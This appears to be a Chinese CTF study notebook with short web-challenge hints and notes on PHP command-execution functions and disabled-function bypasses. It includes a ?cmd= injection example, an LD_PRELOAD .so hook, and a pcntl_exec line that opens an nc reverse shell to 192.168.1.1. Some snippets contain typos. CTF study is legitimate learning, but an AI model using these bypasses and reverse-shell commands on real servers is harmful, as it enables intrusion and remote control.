# 题目

## [LitCTF 2023]Follow me and hack me

使用hackerbar
![](https://i.imgur.com/ARCYx9Z.png)

## [SWPUCTF 2021 新生赛]Do_you_know_http

利用burpsuite抓包更改，使用WLLM访问
![](https://imgur.com/Uq8BtLG.png)
在响应中获取新地址并修改浏览器访问
![](https://imgur.com/kTT2kXb.png)
连续两次
![](https://imgur.com/xvMlgyH.png)
要求本地访问，修改请求头伪造本地访问
![](https://imgur.com/TFduMyU.png)
访问新地址获得flag
![](https://imgur.com/jyhXzvx.png)

## [LitCTF 2023]就当无事发生

查看github更改记录
![](https://imgur.com/eNFbGw5.png)

## [第五空间 2021]WebFTP

使用御剑扫描工具
![](https://imgur.com/CVcZf8B.png)
打开phpinfo.php,ctrl+f搜索flag
![](https://imgur.com/fsyjSVa.png)

## [SWPUCTF 2021 新生赛]easyrce

![](https://imgur.com/sQWV6G2.png)
![](https://imgur.com/vgybZxr.png)

## [SWPUCTF 2022 新生赛]奇妙的MD5

![](https://imgur.com/2NP5aQN.png)

## [BJDCTF 2020]easy_md5

![](https://imgur.com/qYhngzI.png)

# 学习

贴一点学习笔记吧T_T

## 命令执行常见函数

重点：如何运行，运行条件，参数，能否回显

### system()

**函数定义**

- string system(string $command, int &$return_var = ?)
  **参数**：
- $command：要执行的系统命令（字符串）。
- $return_var（可选）：命令执行后的返回值（引用传递）。返回值：命令执行的输出（字符串）。
- 提交命令（参数）————返回结果（回显）

### exec()

**函数定义**

- string exec(string $command, array &$output = null, int &$return_var = null)
  **参数**：
- $command：要执行的系统命令（字符串）。单独使用时只有最后一行结果，且不会回显。
- $output（可选）：命令执行的输出（引用传递）。
- $return_var（可选）：命令执行后的返回值（引用传递）。
- 提交命令（output参数填充数组）—— print_r ——返回结果（回显）

### passthru()

**函数定义**

- void passthru(string $command, int &$return_var = null)
  **参数**：
- $command：要执行的系统命令（字符串）。输出二进制数据，并且需要直接传送到浏览器。
- $return_var（可选）：命令执行后的返回值（引用传递）。
  提交命令（参数）—— 输出二进制数据 ——返回结果（回显）

### shell_exec()

**函数定义**

- string shell_exec(string $cmd)
  **参数**：
- $cmd参数：要执行的系统命令（字符串）。
  单独使用时只有最后一行结果，且不会回显。
  环境执行命令，并且将完整的输出以字符串方式返回。借用echo，print等输出结果。
- 提交命令（参数）——返回结果（回显）

### popen()

**函数定义**

- resource popen(string $command, string $mode)
  **参数**：
- $command：要执行的系统命令（字符串）。
- $mode：打开管道的模式（字符串）。ry：读写，w：只写，r：只读。
  打开一个管道，并返回一个资源。
- 提交命令（参数）——返回结果（回显）

### proc_open()

**函数定义**

- resource proc_open(string $command, array $descriptorspec, array &$pipes, string $cwd = null, array $env = null, array $other_options = null)
  **参数**：
- $command：要执行的系统命令（字符串）。
- $descriptorspec：定义数组内容，描述符（数组）。
- $pipes：调用数组内容，管道（引用传递）。
- $cwd：工作目录（字符串）。
- $env：环境变量（数组）。
- $other_options：其他选项（数组）。
  打开一个进程，并返回一个资源。

### pcntl_exec()

**函数定义**

- bool pcntl_exec(string $path, array $args, array $envs = null)
  **参数**：
- $path：可执行的二进制文件（字符串）。
- $args：参数数组（数组）。
- $envs：环境变量数组（数组）。
  执行外部程序，替换当前进程。

## 替换绕过函数过滤

?cmd=passthre('cat flag.php'); //执行命令，输出flag.php内容

## LD_PRELOAD 绕过函数过滤

### mail

绕过条件：
能上传.so文件，并设置LD_PRELOAD环境变量

```
#vim demo.php
```

```php
<?php
mail(",",");
?>
```

```
#strace -o 1.tet -f php demo.php 
```

把demo.php的系统调用记录到1.tet文件中

```
#cat 1.tet | grep execve
```

查看调用哪些子进程

```
"/usr/sbin/sendmail"
```

```
#readelf -Ws /usr/sbin/sendmail 
```

查看sendmail调用哪些库

```
geteuid
```

![](https://imgur.com/LOavMgU.png)

```
#vim demo.c
```

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
  system("echo'你的邮件还能发出去么？'");
}
int geteuid() {
   unsetenv("LD_PRELOAD")；
   payload();
}
```

```
#gcc -shared -fPIC demo.c -o demo.so
```

将带有命令的c文件编译成so文件，生成动态链接库文件

## 蚁剑及pcntl绕过函数过滤

### 蚁剑

咋这样

### pcntl_exec

pcntl_exec(string $path, array $args = ?, array $envs = ?)

- 参数path：必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标
  头的脚本（比如文件第一行是＃!/usr/local/bin/perl的perl脚本）。
- 参数args：是一个要传递给程序的参数的字符串数组。
- 参数envs：是一个要传递给程序作为环境变量的字符串数组。
  info信息：没有禁用pcntl_exec函数
  pcntl_exec函数没有回显
  解决方法一：cat文件并输出到有权限读取路径；
  解决方法二：shell反弹
  post提交

```
cmd=pcntl_exec('/bin/sh',array("-c","nc 192.168.1.1 8888 -e /bin/bash"));
```

参数path：/bin/bash
参数args：以数组形式包裹
c执行二进制文件
nc反弹tcp连接
可以在kali执行命令
